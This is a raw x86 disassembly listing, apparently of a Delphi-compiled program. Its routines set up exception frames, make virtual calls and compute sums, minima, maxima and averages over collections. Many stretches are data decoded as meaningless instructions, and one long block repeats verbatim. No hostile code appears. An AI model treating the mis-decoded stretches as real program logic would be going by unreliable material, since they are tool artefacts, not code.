in eax dx
inc esi
add [ edi ] al
andps xmm1 [ edi + ebp * 2 + 0x77 ]
push esp
inc esi
jne r-xdata
adc [ eax + ecx * 2 + 0x69 ] dl
push 0x46656554
jne r-xdata
pop es
inc esi
add ah dl
inc ebx
inc esi
add [ 0x65540800 ] al
inc esi
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
inc ebx
xor eax eax
push esp
inc esi
jne r-xdata
inc ecx
add [ esi + ebx * 4 - 0x615fffba ] ch
inc ecx
add [ ebp + ebx * 4 + 0x41 ] ch
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec eax
in eax dx
inc esi
add ah dl
inc ebx
inc esi
add [ 0x65540800 ] al
inc esi
jne r-xdata
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0xf1900046 0x46
adc dl dh
inc esi
add al al
popfd
inc esi
add [ edi ] cl
push esp
dec esp
outsd
ja r-xdata
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
arpl [ ecx ] bp
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
in eax dx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x480046ed ] dl
add [ eax ] al
add [ ebx + eax * 2 ] bl
inc esi
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472d70
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ ebp - 0x8 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
js r-xdata
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0xf29c0046 0x46
inc esp
inc esi
add al al
popfd
inc esi
add [ ebx ] dl
push esp
inc ecx
jbe r-xdata
fsub [ ecx - 0x613fffbf ]
inc esi
add [ eax ] cl
add [ eax ] al
sbb al 0x43
inc esi
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472e40
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
arpl [ ecx ] bp
add [ ebx + 0x46ee18c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x12 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x12 ] ah
jb r-xdata
inc esi
add [ edi ] al
adc edx [ ecx + eax * 2 + 0x76 ]
jb r-xdata
fstp [ ebp - 0x8 ]
fwait
inc esi
dec ebx
jne r-xdata
push ecx
or al 0xdc
inc ebp
clc
push esp
inc esi
jne r-xdata
pop ebp
retn 0x4
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb dh ch
inc esi
add ah dl
inc ebx
inc esi
add [ 0x65540800 ] al
inc esi
jne r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
arpl [ ecx ] bp
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
call sub_469804
mov edi eax
cmp ebx 0xffffffff
jne r-xdata
fld [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax edi
call sub_468ea0
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov edx ebp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x8 ]
fwait
mov edx edi
mov eax [ esp + 0x4 ]
call sub_414098
mov edx eax
mov eax [ esp ]
call sub_469804
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp ebp eax
jge r-xdata
sub_46eb6f
add [ eax ] cl
add [ eax ] al
test al 0xe8
inc esi
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472bc0
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0x97ec0046 0x46
insb
out dx eax
inc esi
add al al
popfd
inc esi
add [ eax - 0x10 ] cl
inc esi
add [ edx ] dl
push esp
inc esp
imul esi [ esi + 0x69 ] 0x65546564
inc esi
jne r-xdata
hlt
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
nop
cld
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + rw-data ] bh
add [ eax ] al
sbb al 0x43
inc esi
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472c9c
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0xf0840046 0x46
add al 0xf1
inc esi
add al al
popfd
inc esi
add [ eax ] dl
push esp
dec eax
imul esp [ edi + 0x68 ] 0x46656554
jne r-xdata
inc eax
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ edx + ebx * 4 + 0x47380041 ] bl
inc ecx
add al cl
popfd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
aam 0xec
inc esi
add [ edi ] al
add [ eax ] al
pushad
out dx al
inc esi
jne r-xdata
add [ esi + ebx * 4 - 0x615fffba ] ch
inc ecx
add [ ebp + ebx * 4 + 0x41 ] ch
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov esi ebx
mov ebx [ ebp + 0x8 ]
sub ebx esi
jl r-xdata
jb r-xdata
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ edx + ebx * 4 + 0x47380041 ] bl
inc ecx
add al cl
popfd
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
movsb [ edi ] [ esi ]
in eax dx
inc esi
add [ edi ] al
andps xmm1 [ edi + ebp * 2 + 0x77 ]
push esp
inc esi
jne r-xdata
adc [ eax + ecx * 2 + 0x69 ] dl
push 0x46656554
jne r-xdata
pop es
inc esi
add ah dl
inc ebx
inc esi
add [ 0x65540800 ] al
inc esi
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
inc ebx
xor eax eax
push esp
inc esi
jne r-xdata
inc ecx
add [ esi + ebx * 4 - 0x615fffba ] ch
inc ecx
add [ ebp + ebx * 4 + 0x41 ] ch
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec eax
in eax dx
inc esi
add ah dl
inc ebx
inc esi
add [ 0x65540800 ] al
inc esi
jne r-xdata
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0xf1900046 0x46
adc dl dh
inc esi
add al al
popfd
inc esi
add [ edi ] cl
push esp
dec esp
outsd
ja r-xdata
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
arpl [ ecx ] bp
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
in eax dx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x480046ed ] dl
add [ eax ] al
add [ ebx + eax * 2 ] bl
inc esi
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472d70
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ ebp - 0x8 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
js r-xdata
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff97880041 ]
inc esi
add [ eax ] dl
0x987c0046 0x46
push esp
0xf29c0046 0x46
inc esp
inc esi
add al al
popfd
inc esi
add [ ebx ] dl
push esp
inc ecx
jbe r-xdata
fsub [ ecx - 0x613fffbf ]
inc esi
add [ eax ] cl
add [ eax ] al
sbb al 0x43
inc esi
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30472e40
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
0x47380041 0x41
enter 0x419d 0x0
lodsb [ esi ]
sahf
inc esi
add [ eax + 0x6c00419e ] ah
popfd
inc ecx
arpl [ ecx ] bp
add [ ebx + 0x46ee18c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x12 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x12 ] ah
jb r-xdata
inc esi
add [ edi ] al
adc edx [ ecx + eax * 2 + 0x76 ]
jb r-xdata
fstp [ ebp - 0x8 ]
fwait
inc esi
dec ebx
jne r-xdata
push ecx
or al 0xdc
inc ebp
clc
push esp
inc esi
jne r-xdata
pop ebp
retn 0x4
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb dh ch
inc esi
add ah dl
inc ebx
inc esi
add [ 0x65540800 ] al
inc esi
jne r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
arpl [ ecx ] bp
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
call sub_469804
mov edi eax
cmp ebx 0xffffffff
jne r-xdata
fld [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax edi
call sub_468ea0
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov edx ebp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x8 ]
fwait
mov edx edi
mov eax [ esp + 0x4 ]
call sub_414098
mov edx eax
mov eax [ esp ]
call sub_469804
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp ebp eax
jge r-xdata
sub_46eefc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
fld [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx ebp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x8 ]
fwait
mov edx edi
mov eax [ esp + 0x4 ]
call sub_414098
mov edx eax
mov eax [ esp ]
call sub_469804
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp ebp eax
jge r-xdata
sub_46ef6c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov bl 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
fld [ esp + 0x10 ]
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test bl bl
je r-xdata
mov edx edi
mov eax [ esp + 0x4 ]
call sub_414098
mov edx eax
mov eax [ esp ]
call sub_469804
mov ebp eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x24 ]
cmp eax [ esp + 0x8 ]
jle r-xdata
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
mov edx [ eax ]
call [ edx + 0x48 ]
fstp [ esp + 0x10 ]
fwait
mov edx [ esp + 0x8 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x10 ]
fwait
xor ebx ebx
jmp r-xdata
sub_46f048
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp + 0x10 ]
fdiv [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x10
sub_46f084
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
call sub_469804
mov edi eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov ebx [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
sub esi ebx
jl r-xdata
mov eax edi
call sub_468e50
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc esi
fld [ ebp - 0x18 ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ ebp - 0x18 ]
fwait
cmp ebx [ ebp - 0x4 ]
jne r-xdata
sub_46f104
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
fld [ esp + 0x8 ]
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x10 ]
fwait
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_414098
mov edx eax
mov eax [ esp ]
call sub_469804
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
cmp ebp eax
jge r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0xc ] eax
fld [ esp + 0x10 ]
fcomp [ esp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
sub_46f190
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
call sub_469804
mov edi eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov ebx [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
sub esi ebx
jl r-xdata
mov eax edi
call sub_468e78
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc esi
fld [ ebp - 0x18 ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jae r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ ebp - 0x18 ]
fwait
cmp ebx [ ebp - 0x4 ]
jne r-xdata
sub_46f210
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
fld [ esp + 0x8 ]
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x10 ]
fwait
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_414098
mov edx eax
mov eax [ esp ]
call sub_469804
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
cmp ebp eax
jge r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0xc ] eax
fld [ esp + 0x10 ]
fcomp [ esp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
sub_46f29c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov edx esi
mov eax ebx
call sub_469804
mov edi eax
mov esi [ ebp - 0x4 ]
mov ebx [ ebp + 0x8 ]
sub ebx esi
jl r-xdata
mov eax esi
call sub_46b9bc
test eax eax
jle r-xdata
mov eax [ ebp + 0x8 ]
sub eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x1c ] eax
fild [ ebp - 0x1c ]
fdivr [ ebp - 0x10 ]
fstp [ ebp - 0x10 ]
fwait
inc ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx esi
mov eax ebx
call sub_469804
call sub_468ea0
fstp [ ebp - 0x18 ]
fwait
mov eax esi
call sub_46b9bc
mov [ ebp - 0x1c ] eax
fild [ ebp - 0x1c ]
fdivr [ ebp - 0x18 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x10 ]
fwait
inc esi
dec ebx
jne r-xdata
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46f344
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov ebp edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ ebp + 0x8 ]
test eax eax
jle r-xdata
fld [ esp + 0x8 ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
xor edx edx
mov [ esp + 0x10 ] edx
mov esi eax
dec esi
test esi esi
jl r-xdata
cmp [ esp + 0x10 ] 0x0
jle r-xdata
inc esi
xor edi edi
fild [ esp + 0x10 ]
fdivr [ esp + 0x8 ]
fstp [ esp + 0x8 ]
fwait
inc edi
dec esi
jne r-xdata
inc [ esp + 0x10 ]
mov edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x8 ]
fwait
mov edx edi
mov eax ebp
call sub_414098
mov edx eax
mov eax [ esp ]
call sub_469804
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp eax [ esp + 0x4 ]
jle r-xdata
sub_46f3d4
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038ec#9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f400
retn
sub_4713a0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d468
mov edx 0x20000000
mov eax esi
call sub_41d618
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0xc ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4713f4
push ebx
mov ebx eax
mov eax ebx
call sub_41d5e4
test eax eax
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_41d5e4
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
pop ebx
retn
sub_47141c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov [ edi + 0x18 ] esi
mov [ edi + 0x4 ] 0x20000000
mov [ edi + 0xc ] 0x1
mov [ edi + 0x1c ] 0x20000000
mov eax [ edi + 0x18 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4713a0
mov [ edi + 0x8 ] eax
mov eax [ edi + 0x18 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c45c
mov [ edi + 0x10 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4714a4
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_403198
mov eax [ esi + 0x8 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_4714e8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414654
mov edi esi
mov edx [ edi + 0x8 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x4 ]
mov [ ebx + 0x4 ] eax
mov al [ edi + 0xc ]
mov [ ebx + 0xc ] al
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47153c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_41d72c
cmp al 0x1
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x8 ]
call sub_4713f4
test al al
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4715b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4621a8
mov [ ebx + 0x14 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov [ ebx + 0x1c ] esi
mov eax [ ebx + 0x4 ]
mov [ esi + 0x24 ] eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
mov [ esi + 0x20 ] eax
mov [ ebx + 0x30 ] 0x1
mov [ ebx + 0xd ] 0x2
mov eax [ ebx + 0x8 ]
mov edx 0xff0000
call sub_41ce24
mov [ ebx + 0x34 ] 0xff0000
mov al [ r-xdata ]
mov [ ebx + 0x38 ] al
mov eax [ ebx + 0x4 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c508
mov [ ebx + 0x18 ] eax
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x4 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4713a0
mov [ ebx + 0x10 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_471679
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_462244
pop edi
pop esi
pop ebx
retn
mov edi esi
mov al [ edi + 0xc ]
mov [ ebx + 0xc ] al
mov al [ edi + 0xd ]
mov [ ebx + 0xd ] al
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov edx [ edi + 0x18 ]
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x1c ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x30 ]
mov [ ebx + 0x30 ] al
sub_4716dc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push j_sub_4038ec#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d034
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_460d98
mov edx [ ebp - 0x8 ]
pop eax
call sub_4042f4
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41d0a8
mov edi eax
call sub_460d38
cmp edi eax
jne r-xdata
mov eax [ ebx + 0x18 ]
cmp eax [ esi + 0x34 ]
jne r-xdata
mov eax ebx
call sub_41d0e4
mov dl [ esi + 0x38 ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47176f
lea eax [ ebp - 0x8 ]
call sub_403ee8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_471778
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x1c ]
call sub_403198
mov eax [ esi + 0x18 ]
call sub_403198
mov eax [ esi + 0x10 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_462214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_471824
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
